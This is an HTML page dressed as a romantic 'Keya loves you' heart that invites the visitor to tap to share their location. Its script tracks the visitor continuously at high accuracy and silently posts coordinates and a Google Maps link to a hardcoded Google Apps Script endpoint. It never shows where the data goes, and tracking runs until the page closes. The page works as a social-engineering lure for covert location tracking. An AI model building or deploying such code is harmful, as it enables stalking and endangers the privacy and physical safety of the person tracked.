<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Keya loves you ðŸ’–</title>
  <style>
    html, body { height: 100%; margin: 0; font-family: Arial, Helvetica, sans-serif; background: linear-gradient(180deg,#fff7fb,#ffeef6); display: flex; align-items: center; justify-content: center; }
    .container { text-align: center; padding: 20px; width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; }
    h1 { margin: 0 0 40px; font-size: 20px; color: #d6336c; position: relative; z-index: 10; }
    .heart-wrap { display: inline-block; cursor: pointer; margin-top: 40px; touch-action: manipulation; }
    .heart { width: 150px; height: 150px; position: relative; transform: rotate(-45deg); background: #ff3b6b; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.15); transition: transform .15s ease, box-shadow .15s ease; display: inline-block; }
    .heart:before, .heart:after { content: ''; position: absolute; width: 150px; height: 150px; background: #ff3b6b; border-radius: 50%; }
    .heart:before { top: -75px; left: 0; }
    .heart:after { left: 75px; top: 0; }
    .heart-wrap:active .heart { transform: rotate(-45deg) scale(.98); }
    .pulse { animation: pulse 1s infinite alternate; }
    @keyframes pulse { from { transform: rotate(-45deg) scale(1); } to { transform: rotate(-45deg) scale(1.04); } }
  </style>
</head>
<body>
  <div class="container" id="tapContainer">
    <h1>Keya loves you â€” if you love her too, tap anywhere to share your location</h1>
    <div class="heart-wrap" id="heartBtn" title="Click to share location">
      <div class="heart pulse" id="heart"></div>
    </div>

    <script>
      const tapContainer = document.getElementById('tapContainer');
      const heart = document.getElementById('heart');
      let watchId = null;
      const SHEET_URL = 'https://script.google.com/macros/s/AKfycbxtNT8UnJHIJEPSNIK4VFKyH1yiFcDGInlAT_uUK_784vRlrP-ynU2x0740jFdXhpuhmA/exec';

      function sendLocationToSheet(lat, lon, accuracy) {
        const gmapsURL = `https://www.google.com/maps?q=${lat},${lon}`;
        fetch(SHEET_URL, {
          method: 'POST',
          mode: 'no-cors',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ latitude: lat, longitude: lon, googleMapsLink: gmapsURL, accuracy: accuracy })
        }).catch(err => console.error('Error sending location:', err));
      }

      function onSuccess(pos) {
        const lat = pos.coords.latitude.toFixed(6);
        const lon = pos.coords.longitude.toFixed(6);
        const acc = pos.coords.accuracy ? Math.round(pos.coords.accuracy) + ' m' : 'N/A';
        sendLocationToSheet(lat, lon, acc);
      }

      function onError(err) {
        console.error('Error getting location:', err);
      }

      function startSharing(){
        if (!('geolocation' in navigator)){
          console.error('Geolocation not supported by this browser.');
          return;
        }
        if(watchId===null){
          watchId = navigator.geolocation.watchPosition(onSuccess, onError, {
            enableHighAccuracy: true,
            maximumAge: 5000,
            timeout: 10000
          });
          heart.classList.add('pulse');
        }
      }

      function stopSharing(){
        if (watchId !== null){
          navigator.geolocation.clearWatch(watchId);
          watchId = null;
          heart.classList.remove('pulse');
        }
      }

      tapContainer.addEventListener('click', () => {
        startSharing();
      });

      window.addEventListener('beforeunload', () => {
        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
      });
    </script>
  </div>
</body>
</html>
